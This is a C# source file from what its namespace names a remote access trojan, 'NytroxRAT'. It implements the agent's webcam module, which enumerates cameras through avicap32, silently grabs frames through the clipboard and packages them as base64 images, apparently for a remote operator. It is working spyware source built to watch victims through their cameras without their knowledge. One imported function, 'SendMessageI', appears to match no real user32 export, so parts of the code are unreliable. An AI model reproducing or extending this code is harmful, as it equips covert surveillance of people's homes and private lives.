using System.Runtime.InteropServices;
using System.Text;
using NytroxRAT.Shared.Models;

namespace NytroxRAT.Agent.Services;

/// <summary>Webcam enumeration and capture via avicap32 (same approach as embedded stub).</summary>
public sealed class WebcamCaptureService
{
    public volatile bool IsRunning;

    public void Start(int index) => IsRunning = true;

    public void Stop() => IsRunning = false;

    public WebcamListResponse ListDevices()
    {
        var resp = new WebcamListResponse();
        for (var i = 0; i < 10; i++)
        {
            var name = new StringBuilder(256);
            var ver  = new StringBuilder(256);
            if (capGetDriverDescriptionA(i, name, 256, ver, 256))
                resp.Devices.Add(new WebcamDevice { Index = i, Name = name.ToString().Trim() });
            else if (i > 0 && resp.Devices.Count == 0) break;
        }
        return resp;
    }

    private readonly object _lock = new();

    public WebcamFramePayload? Capture(int index)
    {
        lock (_lock)
        {
            try
            {
                const int WS_CHILD = 0x40000000;
                const int WM_CAP_CONNECT       = 0x0400 + 10;
                const int WM_CAP_DISCONNECT    = 0x0400 + 11;
                const int WM_CAP_GRAB_FRAME    = 0x0400 + 60;
                const int WM_CAP_COPY          = 0x0400 + 30;
                const int WM_CAP_SET_PREVIEW   = 0x0400 + 50;
                const int WM_CAP_SET_PREVRATE  = 0x0400 + 52;
                const int WM_CAP_SET_SCALE     = 0x0400 + 53;
                const uint CF_DIB = 8;

                var hwnd = capCreateCaptureWindowA("wcap", WS_CHILD, 0, 0, 640, 480, IntPtr.Zero, 0);
                if (hwnd == IntPtr.Zero) return null;
                try
                {
                    if (SendMessageI(hwnd, WM_CAP_CONNECT, index, 0) == 0) return null;
                    SendMessageI(hwnd, WM_CAP_SET_SCALE,    1, 0);
                    SendMessageI(hwnd, WM_CAP_SET_PREVRATE, 66, 0);
                    SendMessageI(hwnd, WM_CAP_SET_PREVIEW,  1, 0);
                    Thread.Sleep(800);
                    SendMessageI(hwnd, WM_CAP_GRAB_FRAME, 0, 0);
                    Thread.Sleep(150);
                    SendMessageI(hwnd, WM_CAP_COPY, 0, 0);

                    if (!OpenClipboard(IntPtr.Zero)) return null;
                    byte[]? imgData = null;
                    try
                    {
                        var hDib = GetClipboardData(CF_DIB);
                        if (hDib != IntPtr.Zero)
                        {
                            var ptr = GlobalLock(hDib);
                            if (ptr != IntPtr.Zero)
                            {
                                try
                                {
                                    var size = (int)(uint)GlobalSize(hDib);
                                    var dib  = new byte[size];
                                    Marshal.Copy(ptr, dib, 0, size);
                                    using var bms = new MemoryStream();
                                    var fileSize   = 14 + size;
                                    const int dataOffset = 54;
                                    bms.Write(new byte[] { 0x42, 0x4D });
                                    bms.Write(BitConverter.GetBytes(fileSize));
                                    bms.Write(new byte[4]);
                                    bms.Write(BitConverter.GetBytes(dataOffset));
                                    bms.Write(dib);
                                    imgData = bms.ToArray();
                                }
                                finally { GlobalUnlock(hDib); }
                            }
                        }
                    }
                    finally { CloseClipboard(); }

                    SendMessageI(hwnd, WM_CAP_DISCONNECT, 0, 0);
                    if (imgData == null) return null;
                    return new WebcamFramePayload { ImageBase64 = Convert.ToBase64String(imgData), Width = 640, Height = 480 };
                }
                finally { DestroyWindow(hwnd); }
            }
            catch { return null; }
        }
    }

    [DllImport("avicap32.dll", CharSet = CharSet.Ansi)]
    private static extern bool capGetDriverDescriptionA(int wDriverIndex, StringBuilder lpszName, int cbName, StringBuilder lpszVer, int cbVer);

    [DllImport("avicap32.dll", CharSet = CharSet.Ansi)]
    private static extern IntPtr capCreateCaptureWindowA(string lpszWindowName, int dwStyle, int x, int y, int nWidth, int nHeight, IntPtr hWnd, int nID);

    [DllImport("user32.dll")] private static extern int  SendMessageI(IntPtr hWnd, int Msg, int wParam, int lParam);
    [DllImport("user32.dll")] private static extern bool DestroyWindow(IntPtr hWnd);
    [DllImport("user32.dll")] private static extern bool OpenClipboard(IntPtr hWndNewOwner);
    [DllImport("user32.dll")] private static extern bool CloseClipboard();
    [DllImport("user32.dll")] private static extern IntPtr GetClipboardData(uint uFormat);
    [DllImport("kernel32.dll")] private static extern IntPtr GlobalLock(IntPtr hMem);
    [DllImport("kernel32.dll")] private static extern bool   GlobalUnlock(IntPtr hMem);
    [DllImport("kernel32.dll")] private static extern uint   GlobalSize(IntPtr hMem);
}
